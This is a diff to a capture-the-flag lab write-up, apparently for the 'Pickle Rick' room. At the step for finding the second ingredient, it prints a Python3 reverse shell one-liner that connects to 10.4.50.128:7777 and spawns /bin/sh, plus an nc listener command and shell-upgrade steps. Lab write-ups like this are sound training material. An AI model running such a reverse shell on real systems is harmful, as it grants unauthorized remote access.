@@ -44,9 +44,20 @@ Ans- mr. meeseek hair
 
 2. Whats the second ingredient Rick needs?
 
-* Python3 reverse shell:
-```bash
+* Python3 reverse shell on the command panel:
+```python
 python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.4.50.128",7777));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+```
+* Listen on port 7777:
+```bash
+nc -lnvp 7777
+```
+* Elevate the shell:
+```
+/usr/bin/script -qc /bin/bash /dev/null
+ctrl + Z
+stty raw -echo
+!nc
 ```
 * Navigate to /home/rick
 * home directory contents:
